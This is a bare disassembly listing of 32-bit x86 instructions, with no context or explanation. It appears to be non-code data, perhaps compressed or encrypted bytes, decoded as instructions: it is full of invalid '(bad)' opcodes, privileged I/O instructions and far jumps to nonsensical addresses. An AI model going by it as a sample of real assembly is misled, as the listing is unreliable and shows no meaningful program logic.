  40b93b:	cmc    
  40b93c:	pop    ds
  40b93d:	dec    edi
  40b93e:	je     0x40b94e
  40b940:	cmp    eax,0xb5100e20
  40b945:	jae    0x40b983
  40b947:	cmp    eax,0x6ff6ea07
  40b94c:	sbb    BYTE PTR [edx+0x19],dl
  40b94f:	sub    al,BYTE PTR [esi]
  40b951:	(bad)  
  40b952:	xor    dl,ch
  40b954:	and    BYTE PTR [edi+0x19],al
  40b957:	stos   BYTE PTR es:[edi],al
  40b958:	outs   dx,BYTE PTR ds:[esi]
  40b959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95a:	mov    WORD PTR [edx-0x6d0f07ad],ss
  40b960:	fild   QWORD PTR [edx]
  40b962:	or     eax,0x65391785
  40b967:	mov    ds:0xcf78a227,eax
  40b96c:	aaa    
  40b96d:	pop    esi
  40b96e:	or     esi,DWORD PTR [esi]
  40b970:	push   cs
  40b971:	push   eax
  40b972:	xor    al,0x7c
  40b974:	push   edx
  40b975:	cwde   
  40b976:	ret    
  40b977:	loopne 0x40b944
  40b979:	mov    dl,0xda
  40b97b:	push   0x7114ba4e
  40b980:	or     eax,0x81ab7bad
  40b985:	dec    ecx
  40b986:	pop    esi
  40b987:	jle    0x40b9ba
  40b989:	scas   eax,DWORD PTR es:[edi]
  40b98a:	jb     0x40ba06
  40b98c:	mov    esi,0x6cc73713
  40b991:	cdq    
  40b992:	jne    0x40b9a7
  40b994:	popf   
  40b995:	sub    DWORD PTR [esi-0x4d],edx
  40b998:	add    edx,DWORD PTR [ecx]
  40b99a:	pop    ebx
  40b99b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b99c:	stc    
  40b99d:	loop   0x40b997
  40b99f:	sti    
  40b9a0:	fmulp  st(6),st
  40b9a2:	cli    
  40b9a3:	out    0xc7,eax
  40b9a5:	call   0x6b3e:0xb29a512e
  40b9ac:	rcr    DWORD PTR [esi+0x24],cl
  40b9af:	cmp    DWORD PTR [edi+0x3ffdb21b],edx
  40b9b5:	bound  esi,QWORD PTR [edx+ebx*1]
  40b9b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9b9:	leave  
  40b9ba:	sub    eax,0x4faaf36d
  40b9bf:	fmul   DWORD PTR ds:0x12123581
  40b9c5:	mov    ds:0x38d01fef,al
  40b9ca:	je     0x40b992
  40b9cc:	popf   
  40b9cd:	imul   BYTE PTR [esp+ecx*4-0x1071dc8c]
  40b9d4:	call   0xc12e:0xfca55eb9
  40b9db:	retf   0xde4c
  40b9de:	pop    es
  40b9df:	sub    ecx,DWORD PTR ds:0xb8a3cd7
  40b9e5:	dec    esi
  40b9e6:	jecxz  0x40b9c5
  40b9e8:	push   ebp
  40b9e9:	xor    bl,BYTE PTR [edx]
  40b9eb:	int3   
  40b9ec:	fs jae 0x40b986
  40b9ef:	cs push esi
  40b9f1:	adc    DWORD PTR [edi],ebp
  40b9f3:	mov    bh,0x83
  40b9f5:	retf   
  40b9f6:	push   es
  40b9f7:	cmp    DWORD PTR [ebx+0x58],esi
  40b9fa:	mov    al,ds:0x77bfcd7e
  40b9ff:	jp     0x40b990
  40ba01:	xor    DWORD PTR [ecx],edx
  40ba03:	leave  
  40ba04:	pop    edx
  40ba05:	js     0x40b9e0
  40ba07:	push   esi
  40ba08:	push   ds
  40ba09:	shl    DWORD PTR [ebp-0x61],1
  40ba0c:	out    dx,eax
  40ba0d:	aad    0x7a
  40ba0f:	sub    al,0xe0
  40ba11:	outs   dx,DWORD PTR ds:[esi]
  40ba12:	loop   0x40b9a5
  40ba14:	mov    bh,0x7c
  40ba16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba17:	sahf   
  40ba18:	jno    0x40b9e5
  40ba1a:	cdq    
  40ba1b:	cmp    edi,0xbfbfef9f
  40ba21:	dec    DWORD PTR [edi]
  40ba23:	lods   al,BYTE PTR ds:[esi]
  40ba24:	sub    ch,cl
  40ba26:	and    bl,0x10
  40ba29:	mov    esp,0x1cc226e
  40ba2e:	add    al,0x88
  40ba30:	jmp    0x40bab1
  40ba32:	xchg   BYTE PTR [ecx-0x4a0d1044],ch
  40ba38:	into   
  40ba39:	adc    BYTE PTR [ebx],al
  40ba3b:	xchg   BYTE PTR [ebx],dl
  40ba3d:	add    edx,eax
  40ba3f:	or     eax,0x696ab048
  40ba44:	add    al,0xe7
  40ba46:	xchg   DWORD PTR [edi+edx*8-0x40cbdf4c],esi
  40ba4d:	adc    ecx,eax
  40ba4f:	jecxz  0x40ba59
  40ba51:	vmovlpd xmm0,xmm1,QWORD PTR [ebp+0x6835bedd]
  40ba59:	stos   DWORD PTR es:[edi],eax
  40ba5a:	je     0x40ba7b
  40ba5c:	mov    eax,0xb6bf5669
  40ba61:	cli    
  40ba62:	mov    ds:0xd76d0a1c,al
  40ba67:	(bad)  
  40ba68:	out    0x23,eax
  40ba6a:	pop    ebp
  40ba6b:	add    edx,edi
  40ba6d:	and    al,0xdc
  40ba6f:	jne    0x40baaf
  40ba71:	inc    eax
  40ba72:	mov    ds:0x98c2085c,eax
  40ba77:	dec    ecx
  40ba78:	xor    DWORD PTR [eax+0xbc37431],ebp
  40ba7e:	jp     0x40ba4d
  40ba80:	ret    
  40ba81:	ficomp WORD PTR [ebp-0x2380e8c9]
  40ba87:	dec    edx
  40ba88:	sti    
  40ba89:	sub    al,0xb0
  40ba8b:	push   ss
  40ba8c:	mov    dl,0xee
  40ba8e:	add    dh,dl
  40ba90:	adc    ebx,esp
  40ba92:	arpl   ax,di
  40ba94:	je     0x40ba9c
  40ba96:	xchg   esp,eax
  40ba97:	loopne 0x40ba4a
  40ba99:	mov    eax,ds:0xc1f1cfbf
  40ba9e:	jb     0x40baa9
  40baa0:	push   ds
  40baa1:	loopne 0x40bb16
  40baa3:	loope  0x40ba9d
  40baa5:	push   0x435303df
  40baaa:	cmp    BYTE PTR [edx],bh
  40baac:	popf   
  40baad:	pop    es
  40baae:	and    cl,BYTE PTR [esi]
  40bab0:	cs push cs
  40bab2:	or     al,0xfa
  40bab4:	or     ebp,eax
  40bab6:	mov    ah,0x72
  40bab8:	std    
  40bab9:	push   ebx
  40baba:	fst    QWORD PTR [esi-0x65877856]
  40bac0:	jp     0x40baee
  40bac2:	out    0x67,al
  40bac4:	aaa    
  40bac5:	pop    edx
  40bac6:	xor    ecx,esp
  40bac8:	popf   
  40bac9:	test   eax,0xd9c69796
  40bace:	inc    esi
  40bacf:	xchg   esi,eax
  40bad0:	mov    bh,BYTE PTR [ebp+0x61]
  40bad3:	sub    ch,BYTE PTR [edx-0x31]
  40bad6:	loopne 0x40bb39
  40bad8:	sub    BYTE PTR [edi+0x26],cl
  40badb:	out    dx,eax
  40badc:	cld    
  40badd:	aas    
  40bade:	imul   esp,DWORD PTR [ebx-0x1cebbd7d],0xffffffde
  40bae5:	cwde   
  40bae6:	push   edx
  40bae7:	xchg   ebp,eax
  40bae8:	int    0xbe
  40baea:	icebp  
  40baeb:	xor    esi,DWORD PTR [ebp-0x710e554a]
  40baf1:	sub    BYTE PTR [eax],ch
  40baf3:	lahf   
  40baf4:	stos   DWORD PTR es:[edi],eax
  40baf5:	push   ds
  40baf6:	daa    
  40baf7:	mov    edx,0x7d2903e3
  40bafc:	sub    al,ah
  40bafe:	aam    0xae
  40bb00:	js     0x40bb09
  40bb02:	fdivr  DWORD PTR [ebp+esi*8+0x46291473]
  40bb09:	icebp  
  40bb0a:	neg    ebx
  40bb0c:	fisub  DWORD PTR [edi+ebp*2+0x54]
  40bb10:	sub    BYTE PTR [edi-0x34],cl
  40bb13:	(bad)
  40bb17:	sub    DWORD PTR [ecx+ebp*2-0x4a],ebx
  40bb1b:	dec    esi
  40bb1c:	test   BYTE PTR [edx+0x6b],cl
  40bb1f:	mov    WORD PTR [ebx-0x23a35da1],?
  40bb25:	icebp  
  40bb26:	and    eax,0x1377099a
  40bb2b:	push   esp
  40bb2c:	sub    eax,0xa981ce8c
  40bb31:	inc    eax
  40bb32:	mov    al,cs:0x121c76b2
  40bb38:	xor    dl,cl
  40bb3a:	dec    ebp
  40bb3b:	push   esi
  40bb3c:	imul   esi,edx,0x790d3c2d
  40bb42:	push   edi
  40bb43:	fst    DWORD PTR [edi]
  40bb45:	xor    al,0xa8
  40bb47:	call   0x28a54f54
  40bb4c:	in     eax,dx
  40bb4d:	jg     0x40bb6b
  40bb4f:	outs   dx,BYTE PTR ds:[esi]
  40bb50:	sbb    DWORD PTR [eax+0x46ab3598],0x3a
  40bb57:	push   0xffffffc4
  40bb59:	pop    esi
  40bb5a:	imul   eax,DWORD PTR [edx+0x50],0xa4f2ea28
  40bb61:	aas    
  40bb62:	(bad)  
  40bb63:	mov    bl,0xe7
  40bb65:	mov    ebx,0x1dfb77fb
  40bb6a:	sub    ch,BYTE PTR [eax+edi*2+0x3a]
  40bb6e:	xor    bl,BYTE PTR [eax-0x65]
  40bb71:	leave  
  40bb72:	cmp    DWORD PTR [eax-0x9dd13e3],ebp
  40bb78:	fldenv ss:[eax-0x11309f32]
  40bb7f:	(bad)  
  40bb80:	repz mov ch,0x82
  40bb83:	push   ecx
  40bb84:	ror    WORD PTR [edx+esi*2-0x78a399ff],1
  40bb8c:	and    cl,0x84
  40bb8f:	inc    ebp
  40bb90:	mov    esp,0x16800090
  40bb95:	push   esi
  40bb96:	dec    ebp
  40bb97:	dec    edx
  40bb98:	out    dx,eax
  40bb99:	popf   
  40bb9a:	and    bh,BYTE PTR [ecx-0x21]
  40bb9d:	inc    esp
  40bb9e:	jle    0x40bbbf
  40bba0:	stos   DWORD PTR es:[edi],eax
  40bba1:	stos   DWORD PTR es:[edi],eax
  40bba2:	sar    DWORD PTR [bx+si+0x6d],0x39
  40bba7:	idiv   DWORD PTR [esi+0x1af4948c]
  40bbad:	mov    dl,0x98
  40bbaf:	outs   dx,BYTE PTR ds:[esi]
  40bbb0:	aas    
  40bbb1:	test   DWORD PTR [esi],eax
  40bbb3:	xor    DWORD PTR [ecx+0x22],eax
  40bbb6:	outs   dx,BYTE PTR ds:[esi]
  40bbb7:	in     al,dx
  40bbb8:	mov    esi,0x46a11aaf
  40bbbd:	inc    esi
  40bbbe:	mov    ch,0xbd
  40bbc0:	add    al,0x19
  40bbc2:	out    dx,eax
  40bbc3:	aad    0xdb
  40bbc5:	or     al,0x2a
  40bbc7:	js     0x40bb54
  40bbc9:	mov    al,0xea
  40bbcb:	gs xchg ebx,eax
  40bbcd:	popa   
  40bbce:	dec    edi
  40bbcf:	dec    ebx
  40bbd0:	enter  0xf88b,0x50
  40bbd4:	xor    bl,0x8e
  40bbd7:	fst    DWORD PTR [ebx]
  40bbd9:	stos   BYTE PTR es:[edi],al
  40bbda:	dec    BYTE PTR [esi+edx*2-0x567d692e]
  40bbe1:	cmp    DWORD PTR [esi+0x7c8bfb55],ecx
  40bbe7:	sub    edi,DWORD PTR [eax+0x5]
  40bbea:	dec    ecx
  40bbeb:	call   0xc60b:0x976743b8
  40bbf2:	mov    edi,0xc793d671
  40bbf7:	and    BYTE PTR [edx],ah
  40bbf9:	cmc    
  40bbfa:	xor    al,0x65
  40bbfc:	leave  
  40bbfd:	rcl    DWORD PTR [eax],0xd1
  40bc00:	mov    cl,0x98
  40bc02:	aam    0x96
  40bc04:	xor    al,cl
  40bc06:	stos   DWORD PTR es:[edi],eax
  40bc07:	adc    ah,al
  40bc09:	mov    ah,0xe
  40bc0b:	into   
  40bc0c:	jmp    0xc94d:0x2eca81ba
  40bc13:	out    0xe9,al
  40bc15:	retf   0x2c84
  40bc18:	fwait
  40bc19:	cmp    ebx,edx
  40bc1b:	xor    DWORD PTR [ecx+esi*2+0x73b4f311],edi
  40bc22:	mov    ebx,0xcca467cd
  40bc27:	out    dx,al
  40bc28:	mov    ds,WORD PTR [ecx+0xe]
  40bc2b:	mov    ?,WORD PTR [edi]
  40bc2d:	mov    dh,0x15
  40bc2f:	jno    0x40bc27
  40bc31:	out    dx,al
  40bc32:	sub    al,0x4c
  40bc34:	cmp    al,0x8a
  40bc36:	add    BYTE PTR [ecx+0x36841e2],0x26
  40bc3d:	cmp    al,0x6f
  40bc3f:	cmp    BYTE PTR [edi],dl
  40bc41:	clc    
  40bc42:	pusha  
  40bc43:	inc    edx
  40bc44:	sbb    esp,DWORD PTR [esi-0x12]
  40bc47:	dec    eax
  40bc48:	fbstp  TBYTE PTR [ebx-0x40]
  40bc4b:	mov    WORD PTR [edx],ds
  40bc4d:	dec    edi
  40bc4e:	xchg   ebp,eax
  40bc4f:	jne    0x40bcb9
  40bc51:	fwait
  40bc52:	cdq    
  40bc53:	xchg   edi,eax
  40bc54:	inc    ebx
  40bc55:	clc    
  40bc56:	scas   al,BYTE PTR es:[edi]
  40bc57:	inc    ebx
  40bc58:	mov    DWORD PTR [ebx],ebp
  40bc5a:	jmp    0x40bc86
  40bc5c:	sbb    cl,BYTE PTR [ebx-0x64]
  40bc5f:	(bad)  
  40bc60:	jge    0x40bcce
  40bc62:	int    0xcb
  40bc64:	jne    0x40bcc6
  40bc66:	mov    ebx,0xbd7f54a3
  40bc6b:	mov    eax,0xbae199ac
  40bc70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc72:	imul   edi,DWORD PTR [eax],0xffffff96
  40bc75:	int    0x40
  40bc77:	hlt    
  40bc78:	sbb    edi,DWORD PTR [ebp+0x62]
  40bc7b:	in     eax,dx
  40bc7c:	push   ecx
  40bc7d:	pop    es
  40bc7e:	jge    0x40bc2d
  40bc80:	jnp    0x40bc61
  40bc82:	aas    
  40bc83:	pop    ds
  40bc84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc85:	mov    BYTE PTR [ebp+0x2bff221a],ah
  40bc8b:	jmp    0xcc0ea62c
  40bc90:	in     eax,0x8e
  40bc92:	cmp    al,0xa0
  40bc94:	je     0x40bcdd
  40bc96:	pop    es
  40bc97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc98:	and    BYTE PTR [edi+0x60],ah
  40bc9b:	(bad)  
  40bc9c:	or     al,0xb5
  40bc9e:	xor    al,0xc8
  40bca0:	das    
  40bca1:	push   0x45
  40bca3:	mov    ch,BYTE PTR [edi]
  40bca5:	push   esp
  40bca6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bca7:	out    0x34,al
  40bca9:	jo     0x40bc98
  40bcab:	imul   BYTE PTR [ebx]
  40bcad:	pop    esi
  40bcae:	aad    0xc9
  40bcb0:	das    
  40bcb1:	xor    bh,dh
  40bcb3:	lea    ebp,es:[esi]
  40bcb6:	push   ebp
  40bcb7:	mov    cl,0x63
  40bcb9:	inc    esi
  40bcba:	leave  
  40bcbb:	pop    edx
  40bcbc:	push   ds
  40bcbd:	cmp    cl,BYTE PTR [ecx]
  40bcbf:	out    0x13,eax
  40bcc1:	inc    ebx
  40bcc2:	retf   0x4367
  40bcc5:	(bad)  
  40bcc6:	jns    0x40bd0b
  40bcc8:	pop    edx
  40bcc9:	and    bh,dl
  40bccb:	add    eax,0x27276b3a
  40bcd0:	sbb    eax,0x4fce94da
  40bcd5:	cmp    al,0x6d
  40bcd7:	jmp    0xc0aa:0x984ceefb
  40bcde:	mov    esi,0xbb49ea01
  40bce3:	int    0x5c
  40bce5:	push   esi
  40bce6:	inc    eax
  40bce7:	(bad)  
  40bce8:	sti    
  40bce9:	xchg   ebx,eax
  40bcea:	jp     0x40bcc2
  40bcec:	push   esi
  40bced:	mov    esp,0xc364482d
  40bcf2:	fisttp DWORD PTR [ecx+edi*8-0x59ff0375]
  40bcf9:	inc    esi
  40bcfa:	xchg   ebx,eax
  40bcfb:	aad    0x81
  40bcfd:	std    
  40bcfe:	in     eax,0xdc
  40bd00:	test   al,0x50
  40bd02:	mov    bh,0x5
  40bd04:	in     eax,0x1f
  40bd06:	cmp    edi,0x7b
  40bd09:	inc    esp
  40bd0a:	sbb    ch,cl
  40bd0c:	xchg   edi,eax
  40bd0d:	push   edi
  40bd0e:	cs mov eax,0xa02c640e
  40bd14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd15:	(bad)  
  40bd16:	retf   
  40bd17:	les    ebx,FWORD PTR [ebx+edx*8]
  40bd1a:	mov    al,0xa7
  40bd1c:	jae    0x40bcc9
  40bd1e:	and    DWORD PTR [edx-0x15],ebx
  40bd21:	es mov ebx,ebx
  40bd24:	jb     0x40bda2
  40bd26:	xchg   ebx,eax
  40bd27:	mov    ebx,0x562f694
  40bd2c:	mov    BYTE PTR [ecx-0x6ba2d17d],bh
  40bd32:	xchg   esi,eax
  40bd33:	adc    BYTE PTR [esi+0x8f0949],dl
  40bd39:	xor    dh,BYTE PTR [edx]
  40bd3b:	jmp    0x40bd56
  40bd3d:	repnz or al,0x47
  40bd40:	lahf   
  40bd41:	or     DWORD PTR [esi-0x4c2f98b],esi
  40bd47:	test   DWORD PTR [edx+0x7a61a907],edi
  40bd4d:	xchg   esi,eax
  40bd4e:	fnsave [esi]
  40bd50:	stos   BYTE PTR es:[edi],al
  40bd51:	ins    DWORD PTR es:[edi],dx
  40bd52:	sbb    BYTE PTR [edi+eiz*8+0x29064c3c],0x4c
  40bd5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd5b:	add    bh,cl
  40bd5d:	inc    ebp
  40bd5e:	sub    eax,0x1b31ab8c
  40bd63:	jno    0x40bda9
  40bd65:	sub    ecx,DWORD PTR [eax+ebp*2+0x7b]
  40bd69:	out    0xff,al
  40bd6b:	cmp    DWORD PTR [esi],ebp
  40bd6d:	pop    eax
  40bd6e:	or     eax,0x79f461fe
  40bd73:	shr    DWORD PTR [edi-0x7],cl
  40bd76:	sub    BYTE PTR [edx+eax*4-0x49f89d43],0xc3
  40bd7e:	outs   dx,DWORD PTR ds:[esi]
  40bd7f:	fiadd  DWORD PTR [esi+0x2041ba9d]
  40bd85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd86:	jge    0x40bdf0
  40bd88:	mov    BYTE PTR [ebp-0x47c88f43],ch
  40bd8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd8f:	mov    cl,BYTE PTR [edi+eiz*2+0x7a]
  40bd93:	ss jge 0x40bd64
  40bd96:	push   esi
  40bd97:	aas    
  40bd98:	sbb    eax,0xbc4617e
  40bd9d:	mov    al,0xd9
  40bd9f:	cwde   
  40bda0:	lock jb 0x40bd8d
  40bda3:	xchg   esp,eax
  40bda4:	cmp    eax,0xa43af6ba
  40bda9:	add    edx,edx
  40bdab:	clc    
  40bdac:	lock sub ebp,DWORD PTR [eax+eax*4]
  40bdb0:	sbb    al,BYTE PTR ds:0xa19f1f3c
  40bdb6:	js     0x40be15
  40bdb8:	mov    edi,0xf193e7d3
  40bdbd:	cwde   
  40bdbe:	xor    BYTE PTR [ecx-0x7d031c25],0x43
  40bdc5:	or     ah,BYTE PTR [ecx+0x15]
  40bdc8:	adc    DWORD PTR [edi-0x351a163],esp
  40bdce:	pop    ebp
  40bdcf:	pop    ecx
  40bdd0:	out    dx,al
  40bdd1:	mov    ebx,0x87de5eb1
  40bdd6:	sbb    al,0xcc
  40bdd8:	inc    ebp
  40bdd9:	sub    bl,BYTE PTR [esp+ebx*4+0x52]
  40bddd:	jno    0x40bd75
  40bddf:	dec    ebx
  40bde0:	cmp    al,0x22
  40bde2:	and    eax,DWORD PTR [ecx-0x45]
  40bde5:	fcomp  DWORD PTR [esi+esi*1+0x1db2fe3f]
  40bdec:	shl    ah,0xa8
  40bdef:	nop
  40bdf0:	mov    ch,0xd9
  40bdf2:	repnz fwait
  40bdf4:	test   eax,0xc02eb3d7
  40bdf9:	arpl   cx,si
  40bdfb:	cmp    eax,0xfcd546c8
  40be00:	xor    DWORD PTR [eax+0xa30a210],ecx
  40be06:	mov    ebp,0xb4f34a71
  40be0b:	and    eax,0xd52feb8a
  40be10:	loope  0x40be8f
  40be12:	mov    ?,WORD PTR [edi+0x14]
  40be15:	fcmovnb st,st(7)
  40be17:	and    DWORD PTR [edx-0x23],edi
  40be1a:	mov    BYTE PTR [eax+0x4634ad5],ah
  40be20:	int3   
  40be21:	call   0x6264:0x5c5da807
  40be28:	(bad)  
  40be29:	sar    BYTE PTR [eax+0x33],1
  40be2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be2d:	add    eax,0xa85a0e08
  40be32:	in     eax,0x85
  40be34:	popa   
  40be35:	pop    ss
  40be36:	fisttp WORD PTR [edx]
  40be38:	retf   0x3cf9
  40be3b:	cs mov ebx,0x81300290
  40be41:	push   0xffffffe2
  40be43:	das    
  40be44:	clc    
  40be45:	(bad)  
  40be46:	std    
  40be47:	dec    ebp
  40be48:	mov    esp,0x29341dac
  40be4d:	pushf  
  40be4e:	mov    ecx,0xe4c75851
  40be53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be54:	sub    DWORD PTR [esi],0x78cc95b4
  40be5a:	jo     0x40be09
  40be5c:	and    esp,eax
  40be5e:	outs   dx,BYTE PTR ds:[esi]
  40be5f:	jo     0x40be2f
  40be61:	lea    edx,[edi]
  40be63:	sbb    ecx,DWORD PTR [bx+di-0x26c6]
  40be68:	aad    0x1f
  40be6a:	push   ecx
  40be6b:	mov    dl,0xbf
  40be6d:	and    DWORD PTR [esi],ebx
  40be6f:	bound  esi,QWORD PTR [ebx]
  40be71:	ror    BYTE PTR [edx],cl
  40be73:	inc    ebp
  40be74:	data16 (bad) 
  40be76:	repnz xchg ebp,eax
  40be78:	jnp    0x40bebe
  40be7a:	and    eax,0x6a21e6e8
  40be7f:	add    dl,BYTE PTR [esi-0x77]
  40be82:	jns    0x40beb0
  40be84:	stos   DWORD PTR es:[edi],eax
  40be85:	sub    al,0xb1
  40be87:	pushf  
  40be88:	rol    bl,0x6
  40be8b:	sbb    BYTE PTR [ebx],ah
  40be8d:	or     edx,esi
  40be8f:	call   0x211175b8
  40be94:	fcmovne st,st(7)
  40be96:	pop    esp
  40be97:	lahf   
  40be98:	xchg   ecx,ecx
  40be9a:	jns    0x40be90
  40be9c:	pop    esi
  40be9d:	stos   BYTE PTR es:[edi],al
  40be9e:	add    BYTE PTR [eax+0x36],al
  40bea1:	push   ecx
  40bea2:	scas   eax,DWORD PTR es:[edi]
  40bea3:	dec    esi
  40bea4:	test   BYTE PTR [ecx],dh
  40bea6:	xchg   ecx,eax
  40bea7:	adc    al,0x8b
  40bea9:	dec    ecx
  40beaa:	jns    0x40be8f
  40beac:	jbe    0x40be91
  40beae:	lds    ecx,FWORD PTR [esi+0x77]
  40beb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40beb2:	mov    dl,0xf9
  40beb4:	std    
  40beb5:	xor    BYTE PTR [edi],0xc9
  40beb8:	sbb    ah,al
  40beba:	add    bl,BYTE PTR [edi+0xa]
  40bebd:	das    
  40bebe:	add    DWORD PTR [edi+edi*4],esp
  40bec1:	sar    BYTE PTR ds:0x73a3cf02,1
  40bec7:	inc    ebp
  40bec8:	packssdw mm2,QWORD PTR ds:0x9b84435e
  40becf:	(bad)  
  40bed0:	fimul  DWORD PTR ds:0x7bdc25b8
  40bed6:	xchg   ebx,eax
  40bed7:	sub    dh,BYTE PTR [esi]
  40bed9:	jmp    0x40beed
  40bedb:	mov    ch,0x75
  40bedd:	jns    0x40bee8
  40bedf:	fisttp WORD PTR [edi-0xc]
  40bee2:	and    esi,ecx
  40bee4:	sbb    eax,DWORD PTR [eax]
  40bee6:	jns    0x40bf13
  40bee8:	pop    ecx
  40bee9:	addr16 push ebx
  40beeb:	into   
  40beec:	mov    dh,0xaf
  40beee:	out    dx,eax
  40beef:	jle    0x40bf4c
  40bef1:	sbb    DWORD PTR [ebp+0x7e],ebp
  40bef4:	les    ax,DWORD PTR [edi+0x249d1fba]
  40befb:	arpl   WORD PTR ds:0x769a5546,sp
  40bf01:	dec    eax
  40bf02:	adc    DWORD PTR [ecx+0x191c4918],edx
  40bf08:	(bad)  
  40bf09:	rol    BYTE PTR [eax+0x7bcc590],1
  40bf0f:	fwait
  40bf10:	xor    edi,eax
  40bf12:	(bad)  
  40bf13:	pop    ss
  40bf14:	call   DWORD PTR [ebx+0x691217f3]
  40bf1a:	add    DWORD PTR [ebx+0x1424ac59],0xffffffaa
  40bf21:	stos   DWORD PTR es:[edi],eax
  40bf22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf23:	mov    bh,BYTE PTR [ebx]
  40bf25:	pop    ebx
  40bf26:	dec    ebp
  40bf27:	and    ebx,0xf1297b28
  40bf2d:	aad    0x46
  40bf2f:	xor    esp,ecx
  40bf31:	cwde   
  40bf32:	lea    ebx,[eax+0x15944d4c]
  40bf38:	cmp    eax,0x545561bf
  40bf3d:	pop    esp
  40bf3e:	dec    ebp
  40bf3f:	dec    DWORD PTR [eax]
  40bf41:	lds    ebp,FWORD PTR [ecx-0x2a]
  40bf44:	fs push ds
  40bf46:	jecxz  0x40bf6b
  40bf48:	sti    
  40bf49:	or     ah,BYTE PTR [esi-0x35]
  40bf4c:	ror    dh,1
  40bf4e:	inc    esp
  40bf4f:	pop    edx
  40bf50:	jno    0x40bf4c
  40bf52:	pop    ebp
  40bf53:	aad    0xc0
  40bf55:	test   eax,0x6923441b
  40bf5a:	push   esp
  40bf5b:	xchg   ecx,eax
  40bf5c:	into   
  40bf5d:	or     DWORD PTR [ecx+0x58],esi
  40bf60:	cdq    
  40bf61:	in     al,0x1
  40bf63:	cmp    DWORD PTR [edi],esp
  40bf65:	pop    DWORD PTR [esi]
  40bf67:	ret    
  40bf68:	cmp    edx,ebp
  40bf6a:	push   esp
  40bf6b:	in     al,dx
  40bf6c:	adc    al,0x98
  40bf6e:	cmp    al,0xd0
  40bf70:	add    al,0xfd
  40bf72:	dec    ebp
  40bf73:	push   edi
  40bf74:	mov    ecx,0x78a0c60b
  40bf79:	sahf   
  40bf7a:	mov    ch,0x9f
  40bf7c:	mov    es,WORD PTR [ebp+esi*8-0xe]
  40bf80:	dec    edi
  40bf81:	fwait
  40bf82:	mov    dl,0xa7
  40bf84:	nop
  40bf85:	ja     0x40bf16
  40bf87:	pop    esi
  40bf88:	cmp    DWORD PTR [esi],edi
  40bf8a:	and    eax,0x6190ccd5
  40bf8f:	shr    BYTE PTR [edx],0xf3
  40bf92:	adc    BYTE PTR [edi+0x5991dde1],0x42
  40bf99:	pop    edi
  40bf9a:	arpl   WORD PTR [edx],bx
  40bf9c:	bound  ebx,QWORD PTR [esi+0x54]
  40bf9f:	adc    BYTE PTR [esp+ebp*1-0x1d],bh
  40bfa3:	cli    
  40bfa4:	inc    esi
  40bfa5:	push   esp
  40bfa6:	in     al,dx
  40bfa7:	ds mov edi,0x6bd7c52
  40bfad:	arpl   sp,sp
  40bfaf:	popa   
  40bfb0:	(bad)  
  40bfb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfb3:	aam    0x24
  40bfb5:	out    0x37,eax
  40bfb7:	jns    0x40c022
  40bfb9:	imul   BYTE PTR [edx+0x59669b2c]
  40bfbf:	std    
  40bfc0:	xchg   dh,dl
  40bfc2:	xor    ecx,DWORD PTR ds:0x29c047d9
  40bfc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfc9:	pop    ds
  40bfca:	outs   dx,BYTE PTR ds:[esi]
  40bfcb:	xchg   ebp,eax
  40bfcc:	add    eax,0x8bd980a
  40bfd1:	xor    BYTE PTR [eax+0x57],ch
  40bfd4:	and    eax,0xa6554a12
  40bfd9:	ins    BYTE PTR es:[edi],dx
  40bfda:	xchg   DWORD PTR [eax],eax
  40bfdc:	aad    0xae
  40bfde:	inc    ebp
  40bfdf:	lods   al,BYTE PTR ds:[esi]
  40bfe0:	out    dx,al
  40bfe1:	retf   0xad6b
  40bfe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfe5:	or     DWORD PTR [ebp+ecx*2-0x16],ebp
  40bfe9:	push   ecx
  40bfea:	pop    eax
  40bfeb:	jae    0x40bfd8
  40bfed:	into   
  40bfee:	add    DWORD PTR [eax],0x38
  40bff1:	das    
  40bff2:	or     eax,0x209719f0
  40bff7:	shl    DWORD PTR [edi-0x73],0x62
  40bffb:	ss jmp 0x71f716b4
  40c001:	loopne 0x40c052
  40c003:	leave  
  40c004:	inc    esi
  40c005:	cmp    BYTE PTR [edi-0x3e],bl
  40c008:	adc    esp,DWORD PTR [edi]
  40c00a:	jne    0x40c05f
  40c00c:	loope  0x40c002
  40c00e:	cli    
  40c00f:	fldlg2 
  40c011:	dec    esi
  40c012:	imul   ebx,edi,0xb1d0ce39
  40c018:	rcr    cl,cl
  40c01a:	test   al,0xd6
  40c01c:	popf   
  40c01d:	fdiv   QWORD PTR [ecx+0x65624a28]
  40c023:	ret    
  40c024:	mov    edx,0x3021d840
  40c029:	out    0x35,al
  40c02b:	sbb    ebp,eax
  40c02d:	add    al,0xb
  40c02f:	and    DWORD PTR [ebx-0x32],0xc0071ae5
  40c036:	mov    al,BYTE PTR [edi+ecx*8]
  40c039:	and    al,0x72
  40c03b:	int3   
  40c03c:	cmc    
  40c03d:	int3   
  40c03e:	dec    edx
  40c03f:	sar    BYTE PTR [ebx-0x3d2e499b],0xdf
  40c046:	mov    eax,fs
  40c048:	lods   al,BYTE PTR ds:[esi]
  40c049:	call   0xcf93dbd9
  40c04e:	in     al,0xd6
  40c050:	xchg   edi,eax
  40c051:	rcl    BYTE PTR [edi+ebp*4-0x5],0x7a
  40c056:	and    bl,dh
  40c058:	xchg   ebp,eax
  40c059:	std    
  40c05a:	jnp    0x40c0af
